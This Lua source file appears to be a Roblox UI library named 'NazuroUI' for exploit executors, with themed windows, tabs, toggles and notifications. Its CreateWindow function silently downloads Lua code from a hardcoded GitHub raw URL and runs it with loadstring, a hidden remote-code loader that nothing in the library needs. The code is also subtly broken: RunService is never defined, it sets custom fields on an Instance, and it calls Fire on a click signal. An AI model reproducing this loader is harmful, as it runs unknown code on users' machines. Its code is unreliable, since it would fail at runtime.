--!native
--!optimize 2

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local NazuroUI = {}

-- Theme configuration
NazuroUI.Theme = {
    Primary = Color3.fromRGB(20, 30, 50), -- Deep blue
    Secondary = Color3.fromRGB(30, 40, 60), -- Slightly lighter blue
    Accent = Color3.fromRGB(0, 200, 255), -- Cyan
    Text = Color3.fromRGB(255, 255, 255), -- White
    SubText = Color3.fromRGB(200, 200, 200), -- Light gray
    Error = Color3.fromRGB(255, 80, 80), -- Red for errors
    TweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
    ConfigFolder = "NazuroUI/Configs/"
}

-- File system stubs
local function SafeMakeFolder(path)
    if not isfolder(path) then
        local success, err = pcall(makefolder, path)
        if not success then warn("Failed to create folder: " .. path .. " | Error: " .. tostring(err)) end
    end
end

local function SafeWriteFile(filepath, content)
    local success, err = pcall(writefile, filepath, content)
    if not success then warn("Failed to write file: " .. filepath .. " | Error: " .. tostring(err)) end
end

local function SafeReadFile(filepath)
    if isfile(filepath) then
        local success, content = pcall(readfile, filepath)
        if success then return content end
        warn("Failed to read file: " .. filepath .. " | Error: " .. tostring(content))
    end
    return nil
end

SafeMakeFolder(NazuroUI.Theme.ConfigFolder)

-- Load configuration
local ConfigFile = NazuroUI.Theme.ConfigFolder .. "Settings.json"
local Config = { Toggles = {} }
if isfile(ConfigFile) then
    local content = SafeReadFile(ConfigFile)
    if content then
        local success, decoded = pcall(HttpService.JSONDecode, HttpService, content)
        if success then Config = decoded end
    end
else
    SafeWriteFile(ConfigFile, HttpService:JSONEncode(Config))
end

-- Utility functions
local function RoundedCorners(instance, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius or 8)
    corner.Parent = instance
    return corner
end

local function AddStroke(instance, thickness, color, transparency)
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = thickness or 2
    stroke.Color = color or NazuroUI.Theme.Accent
    stroke.Transparency = transparency or 0
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = instance
    return stroke
end

local function AddGradient(instance)
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, NazuroUI.Theme.Primary),
        ColorSequenceKeypoint.new(1, NazuroUI.Theme.Secondary)
    })
    gradient.Rotation = 45
    gradient.Parent = instance
    return gradient
end

-- Load external UI
local function LoadExternalUI(url)
    local success, content = pcall(HttpService.GetAsync, HttpService, url)
    if success then
        local func, err = loadstring(content)
        if func then
            local ui = func()
            if ui and ui:IsA("ScreenGui") then
                ui.Name = "NazuroUI_" .. tick()
                ui.ResetOnSpawn = false
                ui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                ui.Parent = CoreGui
                if RunService:IsStudio() then ui.Parent = LocalPlayer.PlayerGui end
                return ui
            else
                warn("External UI script did not return a valid ScreenGui")
            end
        else
            warn("Failed to loadstring external UI: " .. tostring(err))
        end
    else
        warn("Failed to fetch UI from " .. url .. ": " .. tostring(content))
    end
    return nil
end

-- Create window
function NazuroUI:CreateWindow(title, icon)
    local externalUIUrl = "https://raw.githubusercontent.com/Gxwebhost/te/refs/heads/main/2r22.lua"
    local ScreenGui = LoadExternalUI(externalUIUrl)

    -- Fallback to programmatic UI if external UI fails to load
    if not ScreenGui then
        ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "NazuroUI_" .. tick()
        ScreenGui.ResetOnSpawn = false
        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        ScreenGui.Parent = CoreGui
        if RunService:IsStudio() then ScreenGui.Parent = LocalPlayer.PlayerGui end

        local MainFrame = Instance.new("Frame")
        MainFrame.Size = UDim2.new(0, 600, 0, 400)
        MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
        MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        MainFrame.BackgroundColor3 = NazuroUI.Theme.Primary
        MainFrame.ClipsDescendants = true
        RoundedCorners(MainFrame)
        AddStroke(MainFrame, 2, NazuroUI.Theme.Accent, 0.7)
        AddGradient(MainFrame)
        MainFrame.Parent = ScreenGui

        local TitleBar = Instance.new("Frame")
        TitleBar.Size = UDim2.new(1, 0, 0, 50)
        TitleBar.BackgroundColor3 = NazuroUI.Theme.Secondary
        RoundedCorners(TitleBar, 6)
        TitleBar.Parent = MainFrame

        local TitleLabel = Instance.new("TextLabel")
        TitleLabel.Size = UDim2.new(1, -60, 1, 0)
        TitleLabel.Position = UDim2.new(0, 50, 0, 0)
        TitleLabel.BackgroundTransparency = 1
        TitleLabel.Text = title or "Nazuro UI"
        TitleLabel.TextColor3 = NazuroUI.Theme.Text
        TitleLabel.TextSize = 20
        TitleLabel.Font = Enum.Font.GothamBold
        TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
        TitleLabel.Parent = TitleBar

        local TitleIcon = Instance.new("ImageLabel")
        TitleIcon.Size = UDim2.new(0, 30, 0, 30)
        TitleIcon.Position = UDim2.new(0, 10, 0.5, -15)
        TitleIcon.BackgroundTransparency = 1
        TitleIcon.Image = icon or "rbxassetid://7072706764"
        TitleIcon.Parent = TitleBar

        local TabButtons = Instance.new("Frame")
        TabButtons.Size = UDim2.new(0, 150, 1, -50)
        TabButtons.Position = UDim2.new(0, 0, 0, 50)
        TabButtons.BackgroundColor3 = NazuroUI.Theme.Secondary
        RoundedCorners(TabButtons, 6)
        TabButtons.Parent = MainFrame

        local TabButtonsLayout = Instance.new("UIListLayout")
        TabButtonsLayout.SortOrder = Enum.SortOrder.LayoutOrder
        TabButtonsLayout.Padding = UDim.new(0, 10)
        TabButtonsLayout.Parent = TabButtons

        local TabButtonsPadding = Instance.new("UIPadding")
        TabButtonsPadding.PaddingLeft = UDim.new(0, 10)
        TabButtonsPadding.PaddingTop = UDim.new(0, 10)
        TabButtonsPadding.Parent = TabButtons

        local ContentFrame = Instance.new("Frame")
        ContentFrame.Size = UDim2.new(1, -150, 1, -50)
        ContentFrame.Position = UDim2.new(0, 150, 0, 50)
        ContentFrame.BackgroundTransparency = 1
        ContentFrame.Parent = MainFrame

        local TabPageLayout = Instance.new("UIPageLayout")
        TabPageLayout.EasingStyle = Enum.EasingStyle.Sine
        TabPageLayout.TweenTime = 0.3
        TabPageLayout.Parent = ContentFrame

        -- Dragging functionality
        local dragging, dragInput, dragStart, startPos
        TitleBar.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = MainFrame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        TitleBar.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                local delta = input.Position - dragStart
                MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)

        -- Assign to ScreenGui for consistency
        ScreenGui.MainFrame = MainFrame
        ScreenGui.TabButtons = TabButtons
        ScreenGui.ContentFrame = ContentFrame
        ScreenGui.TabPageLayout = TabPageLayout
    else
        -- Use external UI, assume it has MainFrame, TabButtons, ContentFrame, and TabPageLayout
        -- Adjust properties to match theme
        local MainFrame = ScreenGui:FindFirstChild("MainFrame") or ScreenGui:FindFirstChild("Main")
        if MainFrame then
            MainFrame.BackgroundColor3 = NazuroUI.Theme.Primary
            MainFrame.Size = UDim2.new(0, 600, 0, 400)
            MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
            MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
            RoundedCorners(MainFrame)
            AddStroke(MainFrame, 2, NazuroUI.Theme.Accent, 0.7)
            AddGradient(MainFrame)
        end

        local TabButtons = ScreenGui:FindFirstChild("TabButtons") or ScreenGui:FindFirstChild("SideBar")
        if TabButtons then
            TabButtons.BackgroundColor3 = NazuroUI.Theme.Secondary
            TabButtons.Size = UDim2.new(0, 150, 1, -50)
            TabButtons.Position = UDim2.new(0, 0, 0, 50)
            RoundedCorners(TabButtons, 6)
        end

        local ContentFrame = ScreenGui:FindFirstChild("ContentFrame") or ScreenGui:FindFirstChild("TabContainer")
        if ContentFrame then
            ContentFrame.Size = UDim2.new(1, -150, 1, -50)
            ContentFrame.Position = UDim2.new(0, 150, 0, 50)
            ContentFrame.BackgroundTransparency = 1
        end

        local TabPageLayout = ContentFrame and ContentFrame:FindFirstChild("UIPageLayout")
        if not TabPageLayout then
            TabPageLayout = Instance.new("UIPageLayout")
            TabPageLayout.EasingStyle = Enum.EasingStyle.Sine
            TabPageLayout.TweenTime = 0.3
            TabPageLayout.Parent = ContentFrame
        end

        -- Clear existing tab buttons to avoid conflicts
        if TabButtons then
            for _, child in ipairs(TabButtons:GetChildren()) do
                if child:IsA("TextButton") or child:IsA("Frame") then
                    child:Destroy()
                end
            end
            local layout = TabButtons:FindFirstChildOfClass("UIListLayout") or Instance.new("UIListLayout")
            layout.SortOrder = Enum.SortOrder.LayoutOrder
            layout.Padding = UDim.new(0, 10)
            layout.Parent = TabButtons

            local padding = TabButtons:FindFirstChildOfClass("UIPadding") or Instance.new("UIPadding")
            padding.PaddingLeft = UDim.new(0, 10)
            padding.PaddingTop = UDim.new(0, 10)
            padding.Parent = TabButtons
        end
    end

    -- Notification system
    local function CreateNotification(options)
        local notification = Instance.new("Frame")
        notification.Size = UDim2.new(0, 250, 0, 80)
        notification.Position = UDim2.new(1, -270, 1, -100)
        notification.BackgroundColor3 = NazuroUI.Theme.Secondary
        notification.Parent = ScreenGui
        RoundedCorners(notification, 6)
        AddStroke(notification, 1, NazuroUI.Theme.Accent, 0.5)

        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, -10, 0, 20)
        title.Position = UDim2.new(0, 5, 0, 5)
        title.Text = options.Title or "Notification"
        title.TextColor3 = NazuroUI.Theme.Text
        title.TextSize = 16
        title.Font = Enum.Font.GothamBold
        title.BackgroundTransparency = 1
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.Parent = notification

        local content = Instance.new("TextLabel")
        content.Size = UDim2.new(1, -10, 0, 50)
        content.Position = UDim2.new(0, 5, 0, 25)
        content.Text = options.Content or "No content"
        content.TextColor3 = NazuroUI.Theme.SubText
        content.TextSize = 14
        content.Font = Enum.Font.Gotham
        content.BackgroundTransparency = 1
        content.TextXAlignment = Enum.TextXAlignment.Left
        content.TextWrapped = true
        content.Parent = notification

        TweenService:Create(notification, NazuroUI.Theme.TweenInfo, {Position = UDim2.new(1, -10, 1, -100)}):Play()
        task.spawn(function()
            wait(options.Duration or 5)
            TweenService:Create(notification, NazuroUI.Theme.TweenInfo, {Position = UDim2.new(1, 270, 1, -100)}):Play()
            wait(0.3)
            notification:Destroy()
        end)
    end

    local Window = {}

    -- Update tab visuals
    local function UpdateTabVisuals(selectedButton)
        for _, button in ipairs(ScreenGui.TabButtons:GetChildren()) do
            if button:IsA("TextButton") then
                local isSelected = button == selectedButton
                TweenService:Create(button, NazuroUI.Theme.TweenInfo, {
                    BackgroundTransparency = isSelected and 0 or 0.4,
                    Position = UDim2.new(0, isSelected and 10 or 5, 0, button.Position.Y.Offset)
                }):Play()
                TweenService:Create(button.ImageLabel, NazuroUI.Theme.TweenInfo, {
                    ImageTransparency = isSelected and 0 or 0.4
                }):Play()
                TweenService:Create(button.TextLabel, NazuroUI.Theme.TweenInfo, {
                    TextTransparency = isSelected and 0 or 0.4
                }):Play()
                local stroke = button:FindFirstChild("UIStroke") or AddStroke(button, 2, NazuroUI.Theme.Text, 1)
                stroke.Enabled = isSelected
            end
        end
    end

    function Window:CreateTab(name, icon)
        local TabButton = Instance.new("TextButton")
        TabButton.Name = name
        TabButton.Size = UDim2.new(1, -20, 0, 40)
        TabButton.Position = UDim2.new(0, 10, 0, 0)
        TabButton.BackgroundColor3 = NazuroUI.Theme.Secondary
        TabButton.BackgroundTransparency = 0.4
        TabButton.Text = ""
        TabButton.AutoButtonColor = false
        RoundedCorners(TabButton, 6)
        TabButton.Parent = ScreenGui.TabButtons
        TabButton.LayoutOrder = #ScreenGui.TabButtons:GetChildren()

        local TabIcon = Instance.new("ImageLabel")
        TabIcon.Size = UDim2.new(0, 24, 0, 24)
        TabIcon.Position = UDim2.new(0, 5, 0.5, -12)
        TabIcon.BackgroundTransparency = 1
        TabIcon.Image = icon or "rbxassetid://7072706764"
        TabIcon.ImageTransparency = 0.4
        TabIcon.Parent = TabButton

        local TabLabel = Instance.new("TextLabel")
        TabLabel.Size = UDim2.new(1, -35, 1, 0)
        TabLabel.Position = UDim2.new(0, 30, 0, 0)
        TabLabel.Text = name
        TabLabel.TextColor3 = NazuroUI.Theme.SubText
        TabLabel.TextSize = 14
        TabLabel.Font = Enum.Font.Gotham
        TabLabel.BackgroundTransparency = 1
        TabLabel.TextTransparency = 0.4
        TabLabel.TextXAlignment = Enum.TextXAlignment.Left
        TabLabel.Parent = TabButton

        local TabContent = Instance.new("ScrollingFrame")
        TabContent.Name = name
        TabContent.Size = UDim2.new(1, 0, 1, 0)
        TabContent.BackgroundTransparency = 1
        TabContent.ScrollBarThickness = 4
        TabContent.ScrollBarImageColor3 = NazuroUI.Theme.Accent
        TabContent.Visible = false
        TabContent.Parent = ScreenGui.ContentFrame

        local ContentLayout = Instance.new("UIListLayout")
        ContentLayout.SortOrder = Enum.SortOrder.LayoutOrder
        ContentLayout.Padding = UDim.new(0, 10)
        ContentLayout.Parent = TabContent

        local ContentPadding = Instance.new("UIPadding")
        ContentPadding.PaddingLeft = UDim.new(0, 10)
        ContentPadding.PaddingTop = UDim.new(0, 10)
        ContentPadding.Parent = TabContent

        TabButton.MouseButton1Click:Connect(function()
            for _, tab in ipairs(ScreenGui.ContentFrame:GetChildren()) do
                if tab:IsA("ScrollingFrame") then tab.Visible = false end
            end
            TabContent.Visible = true
            UpdateTabVisuals(TabButton)
            TabContent.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y + 20)
        end)

        if #ScreenGui.TabButtons:GetChildren() == 1 then
            TabButton.MouseButton1Click:Fire()
        end

        local Tab = {}

        function Tab:CreateSection(title)
            local Section = Instance.new("Frame")
            Section.Name = title
            Section.Size = UDim2.new(1, -20, 0, 0)
            Section.BackgroundTransparency = 1
            Section.Parent = TabContent

            local SectionTitle = Instance.new("TextLabel")
            SectionTitle.Size = UDim2.new(1, 0, 0, 30)
            SectionTitle.Text = title
            SectionTitle.TextColor3 = NazuroUI.Theme.Text
            SectionTitle.TextSize = 16
            SectionTitle.Font = Enum.Font.GothamBold
            SectionTitle.BackgroundTransparency = 1
            SectionTitle.TextXAlignment = Enum.TextXAlignment.Left
            SectionTitle.Parent = Section

            local SectionContent = Instance.new("Frame")
            SectionContent.Size = UDim2.new(1, 0, 1, -30)
            SectionContent.Position = UDim2.new(0, 0, 0, 30)
            SectionContent.BackgroundTransparency = 1
            SectionContent.Parent = Section

            local SectionLayout = Instance.new("UIListLayout")
            SectionLayout.SortOrder = Enum.SortOrder.LayoutOrder
            SectionLayout.Padding = UDim.new(0, 8)
            SectionLayout.Parent = SectionContent

            local function UpdateSectionSize()
                Section.Size = UDim2.new(1, -20, 0, SectionLayout.AbsoluteContentSize.Y + 30)
                TabContent.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y + 20)
            end
            SectionLayout.Changed:Connect(UpdateSectionSize)

            local SectionFunctions = {}

            function SectionFunctions:CreateButton(settings)
                local Button = Instance.new("TextButton")
                Button.Size = UDim2.new(1, -10, 0, 40)
                Button.BackgroundColor3 = NazuroUI.Theme.Secondary
                Button.Text = settings.Name or "Button"
                Button.TextColor3 = NazuroUI.Theme.Text
                Button.TextSize = 14
                Button.Font = Enum.Font.Gotham
                Button.AutoButtonColor = false
                RoundedCorners(Button, 6)
                AddStroke(Button, 1, NazuroUI.Theme.Accent, 0.5)
                Button.Parent = SectionContent

                Button.MouseButton1Click:Connect(function()
                    local success, err = pcall(settings.Callback or function() end)
                    if not success then
                        TweenService:Create(Button, NazuroUI.Theme.TweenInfo, {BackgroundColor3 = NazuroUI.Theme.Error}):Play()
                        Button.Text = "Error!"
                        wait(0.5)
                        Button.Text = settings.Name or "Button"
                        TweenService:Create(Button, NazuroUI.Theme.TweenInfo, {BackgroundColor3 = NazuroUI.Theme.Secondary}):Play()
                    else
                        TweenService:Create(Button, NazuroUI.Theme.TweenInfo, {Size = UDim2.new(1, -15, 0, 38)}):Play()
                        wait(0.2)
                        TweenService:Create(Button, NazuroUI.Theme.TweenInfo, {Size = UDim2.new(1, -10, 0, 40)}):Play()
                    end
                end)
                UpdateSectionSize()
            end

            function SectionFunctions:CreateToggle(settings)
                local Toggle = Instance.new("Frame")
                Toggle.Size = UDim2.new(1, -10, 0, 40)
                Toggle.BackgroundColor3 = NazuroUI.Theme.Secondary
                RoundedCorners(Toggle, 6)
                AddStroke(Toggle, 1, NazuroUI.Theme.Accent, 0.5)
                Toggle.Parent = SectionContent

                local ToggleLabel = Instance.new("TextLabel")
                ToggleLabel.Size = UDim2.new(1, -60, 1, 0)
                ToggleLabel.Position = UDim2.new(0, 5, 0, 0)
                ToggleLabel.Text = settings.Name or "Toggle"
                ToggleLabel.TextColor3 = NazuroUI.Theme.Text
                ToggleLabel.TextSize = 14
                ToggleLabel.Font = Enum.Font.Gotham
                ToggleLabel.BackgroundTransparency = 1
                ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
                ToggleLabel.Parent = Toggle

                local ToggleSwitch = Instance.new("Frame")
                ToggleSwitch.Size = UDim2.new(0, 50, 0, 20)
                ToggleSwitch.Position = UDim2.new(1, -55, 0.5, -10)
                ToggleSwitch.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
                RoundedCorners(ToggleSwitch, 10)
                ToggleSwitch.Parent = Toggle

                local ToggleIndicator = Instance.new("Frame")
                ToggleIndicator.Size = UDim2.new(0, 20, 0, 20)
                ToggleIndicator.Position = UDim2.new(0, 5, 0, 0)
                ToggleIndicator.BackgroundColor3 = NazuroUI.Theme.Text
                RoundedCorners(ToggleIndicator, 10)
                ToggleIndicator.Parent = ToggleSwitch

                local ToggleButton = Instance.new("TextButton")
                ToggleButton.Size = UDim2.new(1, 0, 1, 0)
                ToggleButton.BackgroundTransparency = 1
                ToggleButton.Text = ""
                ToggleButton.Parent = Toggle

                local flag = settings.Flag
                local state = flag and Config.Toggles[flag] or settings.CurrentValue or false
                if flag and not Config.Toggles[flag] then
                    Config.Toggles[flag] = state
                    SafeWriteFile(ConfigFile, HttpService:JSONEncode(Config))
                end

                local function SetToggle(value)
                    state = value
                    if flag then
                        Config.Toggles[flag] = state
                        SafeWriteFile(ConfigFile, HttpService:JSONEncode(Config))
                    end
                    TweenService:Create(ToggleIndicator, NazuroUI.Theme.TweenInfo, {
                        Position = UDim2.new(0, state and 25 or 5, 0, 0),
                        BackgroundColor3 = state and NazuroUI.Theme.Accent or NazuroUI.Theme.Text
                    }):Play()
                    pcall(settings.Callback or function() end, state)
                end
                SetToggle(state)

                ToggleButton.MouseButton1Click:Connect(function() SetToggle(not state) end)
                UpdateSectionSize()
            end

            return SectionFunctions
        end

        return Tab
    end

    function Window:Notify(options)
        CreateNotification(options)
    end

    function Window:Toggle(state)
        ScreenGui.Enabled = state ~= nil and state or not ScreenGui.Enabled
    end

    return Window
end

return NazuroUI
